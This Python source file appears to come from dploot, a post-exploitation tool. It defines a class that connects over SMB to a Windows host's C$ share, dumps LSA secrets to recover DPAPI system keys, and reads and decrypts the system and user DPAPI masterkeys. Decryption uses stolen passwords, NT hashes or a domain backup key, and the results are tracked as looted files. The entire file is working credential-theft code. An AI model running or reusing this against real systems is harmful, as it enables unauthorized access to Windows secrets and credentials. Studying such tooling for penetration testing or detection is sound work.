from binascii import hexlify, unhexlify
import logging
import ntpath
import os
from typing import Any, Dict, List, Optional
from Cryptodome.Hash import SHA1

from impacket.examples.secretsdump import LSASecrets

from dploot.lib.dpapi import decrypt_masterkey
from dploot.lib.target import Target
from dploot.lib.utils import find_guid, find_sha1, is_guid, parse_file_as_list
from dploot.lib.smb import DPLootSMBConnection


class Masterkey:
    def __init__(self, guid, sha1, user: str = "None") -> None:
        self.guid = guid
        self.sha1 = sha1
        self.user = user

    def __str__(self) -> str:
        return f"{{{self.guid}}}:{self.sha1}"

    def dump(self) -> None:
        print(self)


def parse_masterkey_file(filename) -> List[Masterkey]:
    masterkeys = []
    masterkeys_lines = parse_file_as_list(filename)
    for masterkey in masterkeys_lines:
        guid, sha1 = masterkey.split(":", 1)
        masterkeys.append(
            Masterkey(
                guid=find_guid(guid),
                sha1=find_sha1(sha1),
            )
        )
    return masterkeys


class MasterkeysTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    user_masterkeys_generic_path = "AppData\\Roaming\\Microsoft\\Protect"
    system_masterkeys_generic_path = "Windows\\System32\\Microsoft\\Protect"
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        pvkbytes: Optional[bytes] = None,
        passwords: Optional[Dict[str, str]] = None,
        nthashes: Optional[Dict[str, str]] = None,
        dpapiSystem: Optional[Dict[str, str]] = None,
        per_masterkey_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn
        self.pvkbytes = pvkbytes
        self.passwords = passwords
        self.nthashes = nthashes

        self._users = None
        self.looted_files = {}
        self.dpapiSystem = dpapiSystem
        if self.dpapiSystem is None:
            self.dpapiSystem = {}
        # should be {"MachineKey":"key","Userkey":"key"}

        self.per_masterkey_callback = per_masterkey_callback

    def triage_system_masterkeys(self) -> List[Masterkey]:
        masterkeys = []
        logging.getLogger("impacket").disabled = True
        if len(self.dpapiSystem) == 0:
            if self.conn.local_session:
                self.conn.enable_localops(
                    os.path.join(
                        self.target.local_root, r"Windows/System32/config/SYSTEM"
                    )
                )
            else:
                self.conn.enable_remoteops()
            if self.conn.bootkey:
                logging.debug(f"Got Bootkey: {hexlify(self.conn.bootkey)}")

                try:
                    SECURITYFileName = (
                        os.path.join(
                            self.target.local_root, r"Windows/System32/config/SECURITY"
                        )
                        if self.conn.local_session
                        else self.conn.remote_ops.saveSECURITY()
                    )
                    # retrieve DPAPI keys
                    LSA = LSASecrets(
                        SECURITYFileName,
                        self.conn.bootkey,
                        self.conn.remote_ops,
                        isRemote=(not bool(self.conn.local_session)),
                        perSecretCallback=self.getDPAPI_SYSTEM,
                    )
                    LSA.dumpSecrets()
                    LSA.finish()
                except Exception as e:
                    logging.error("LSA hashes extraction failed: %s" % str(e))

        system_protect_dir = self.conn.remote_list_dir(
            self.share, path=self.system_masterkeys_generic_path
        )
        for d in system_protect_dir:
            if (
                d not in self.false_positive
                and d.is_directory() > 0
                and d.get_longname()[:2] == "S-"
            ):  # could be a better way to deal with sid
                sid = d.get_longname()
                system_protect_dir_sid_path = ntpath.join(
                    self.system_masterkeys_generic_path, sid
                )
                system_sid_dir = self.conn.remote_list_dir(
                    self.share, path=system_protect_dir_sid_path
                )
                for f in system_sid_dir:
                    if f.is_directory() == 0 and is_guid(f.get_longname()):
                        guid = f.get_longname()
                        filepath = ntpath.join(system_protect_dir_sid_path, guid)
                        logging.debug(
                            f"Found SYSTEM system MasterKey: \\\\{self.target.address}\\{self.share}\\{filepath}"
                        )
                        # read masterkey
                        masterkey_bytes = self.conn.readFile(self.share, filepath, looted_files=self.looted_files)
                        if masterkey_bytes is not None:
                            key = decrypt_masterkey(
                                masterkey=masterkey_bytes,
                                dpapi_systemkey=self.dpapiSystem,
                            )
                            if key is not None:
                                masterkey = Masterkey(
                                    guid=guid,
                                    sha1=hexlify(SHA1.new(key).digest()).decode(
                                        "latin-1"
                                    ),
                                    user="SYSTEM",
                                )
                                masterkeys.append(masterkey)
                                if self.per_masterkey_callback is not None:
                                    self.per_masterkey_callback(masterkey)
                    elif f.is_directory() > 0 and f.get_longname() == "User":
                        system_protect_dir_user_path = ntpath.join(
                            system_protect_dir_sid_path, "User"
                        )
                        system_user_dir = self.conn.remote_list_dir(
                            self.share, path=system_protect_dir_user_path
                        )
                        for g in system_user_dir:
                            if g.is_directory() == 0 and is_guid(g.get_longname()):
                                guid = g.get_longname()
                                filepath = ntpath.join(
                                    system_protect_dir_user_path, guid
                                )
                                logging.debug(
                                    f"Found SYSTEM user MasterKey: \\\\{self.target.address}\\{self.share}\\{filepath}"
                                )
                                # read masterkey
                                masterkey_bytes = self.conn.readFile(
                                    self.share, filepath, looted_files=self.looted_files
                                )
                                if masterkey_bytes is not None:
                                    key = decrypt_masterkey(
                                        masterkey=masterkey_bytes,
                                        dpapi_systemkey=self.dpapiSystem,
                                        sid=sid,
                                    )
                                    if key is not None:
                                        masterkey = Masterkey(
                                            guid=guid,
                                            sha1=hexlify(SHA1.new(key).digest()).decode(
                                                "latin-1"
                                            ),
                                            user="SYSTEM_User",
                                        )
                                        masterkeys.append(masterkey)
                                        if self.per_masterkey_callback is not None:
                                            self.per_masterkey_callback(masterkey)
        return masterkeys

    def triage_masterkeys(self) -> List[Masterkey]:
        masterkeys = []
        for user in self.users:
            try:
                masterkeys += self.triage_masterkeys_for_user(user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return masterkeys

    def triage_masterkeys_for_user(self, user: str) -> List[Masterkey]:
        masterkeys = []
        user_masterkey_path = ntpath.join(
            ntpath.join("Users", user), self.user_masterkeys_generic_path
        )
        user_protect_dir = self.conn.remote_list_dir(
            self.share, path=user_masterkey_path
        )
        if (
            user_protect_dir is None
        ):  # Yes, it's possible that users have an AppData tree but no Protect folder
            return masterkeys
        for d in user_protect_dir:
            if (
                d not in self.false_positive
                and d.is_directory() > 0
                and d.get_longname()[:2] == "S-"
            ):  # could be a better way to deal with sid
                sid = d.get_longname()
                user_masterkey_path_sid = ntpath.join(
                    ntpath.join(
                        ntpath.join("Users", user), self.user_masterkeys_generic_path
                    ),
                    sid,
                )
                user_sid_dir = self.conn.remote_list_dir(
                    self.share, path=user_masterkey_path_sid
                )
                for f in user_sid_dir:
                    if f.is_directory() == 0 and is_guid(f.get_longname()):
                        guid = f.get_longname()
                        filepath = ntpath.join(user_masterkey_path_sid, guid)
                        logging.debug(
                            f"Found MasterKey: \\\\{self.target.address}\\{self.share}\\{filepath}"
                        )
                        # read masterkey
                        masterkey_bytes = self.conn.readFile(self.share, filepath, looted_files=self.looted_files)
                        if masterkey_bytes is not None:
                            password = None
                            nthash = None
                            if (
                                self.passwords is not None
                                and user.lower() in self.passwords
                            ):
                                password = self.passwords[user.lower()]
                            elif (
                                self.passwords is not None
                                and user.rpartition(".")[0].lower() in self.passwords
                            ):
                                password = self.passwords[
                                    user.rpartition(".")[0].lower()
                                ]  # In case of duplicate (like admin and admin.waza) on usernames in c:\Users\
                            if (
                                self.nthashes is not None
                                and user.lower() in self.nthashes
                            ):
                                nthash = self.nthashes[user.lower()]
                            elif (
                                self.nthashes is not None
                                and user.rpartition(".")[0].lower() in self.nthashes
                            ):
                                nthash = self.nthashes[user.rpartition(".")[0].lower()]
                            key = decrypt_masterkey(
                                masterkey=masterkey_bytes,
                                domain_backupkey=self.pvkbytes,
                                sid=sid,
                                password=password,
                                nthash=nthash,
                            )
                            if key is not None:
                                masterkey = Masterkey(
                                    guid=guid,
                                    sha1=hexlify(SHA1.new(key).digest()).decode(
                                        "latin-1"
                                    ),
                                    user=user,
                                )
                                masterkeys.append(masterkey)
                                if self.per_masterkey_callback is not None:
                                    self.per_masterkey_callback(masterkey)
        return masterkeys

    def getDPAPI_SYSTEM(self, _, secret) -> None:
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split("\n")
            machineKey = machineKey.split(":")[1]
            userKey = userKey.split(":")[1]
            self.dpapiSystem["MachineKey"] = unhexlify(machineKey[2:])
            self.dpapiSystem["UserKey"] = unhexlify(userKey[2:])

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users
